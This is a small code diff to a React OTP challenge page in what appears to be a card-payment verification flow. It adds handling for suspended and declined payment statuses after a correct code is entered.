@@ -68,11 +68,16 @@ export default function AcsChallengePage() {
           window.setTimeout(() => goBack('completed'), 900);
           return;
         }
-        if (st === 'failed' || st === 'refunded') {
+        if (st === 'failed' || st === 'refunded' || st === 'suspended') {
           if (data.fail_reason === 'otp_attempts_exceeded') {
             setOtpState('failed');
             setFailReason('otp_attempts_exceeded');
+          } else {
+            // Correct OTP but decline / insufficient credit → redirect page message + home 10s
+            setOtpState('declined');
+            setFailReason(data.fail_reason || 'declined');
           }
+          return;
         }
         if (st === 'retry_otp') {
           // Wrong code: stay on Verify with error — never open redirect page first
